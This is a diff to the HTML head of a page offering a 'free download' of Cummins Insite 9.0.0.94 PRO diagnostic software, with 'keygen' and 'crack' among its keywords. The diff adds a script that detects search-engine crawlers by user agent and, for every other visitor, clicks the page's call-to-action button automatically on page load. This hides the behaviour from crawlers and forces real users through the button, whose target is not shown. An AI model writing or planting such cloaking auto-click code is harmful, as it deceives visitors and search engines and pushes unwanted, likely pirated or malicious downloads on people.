@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cummins Insite 9.0.0.94 PRO level + Fleet Cals + Zap It</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Cummins Insite 9.0.0.94 PRO level with Fleet Cals and Zap It for accurate engine diagnostics and programming on Cummins engines.">
     <meta name="keywords" content="Cummins Insite 9.0.0.94 PRO, Cummins Insite PRO level download, Cummins Insite PRO level free download, Cummins Insite 9.0.0.94 PRO Fleet Cals, Cummins Insite 9.0.0.94 Zap It, Cummins Insite diagnostic software, Cummins Insite diagnostic software download, Cummins Insite diagnostic software free download, Cummins Insite diagnostic software keygen, Cummins Insite diagnostic software crack, Cummins Insite 9.0.0.94, Cummins Insite download, Cummins Insite free download, Cummins fleet cals download, Cummins diagnostic software, Cummins diagnostic software free download, Cummins engine software, Cummins troubleshooting software, Cummins diagnostics, Cummins engine programming, Cummins inline hardware, Cummins diagnostics Windows 10, Cummins diagnostics Windows 11, софт для диагностики Cummins, скачать Cummins Insite бесплатно, Cummins Insite 9.0 скачать бесплатно, Cummins Insite 9.0.0.94 скачать, Cummins Insite диагностическое программное обеспечение, Cummins Insite v9.0 скачать, Cummins Insite фритрек Cals, Cummins Insite Зап Ит скачать, Cummins Insite Zap It">
     <style>
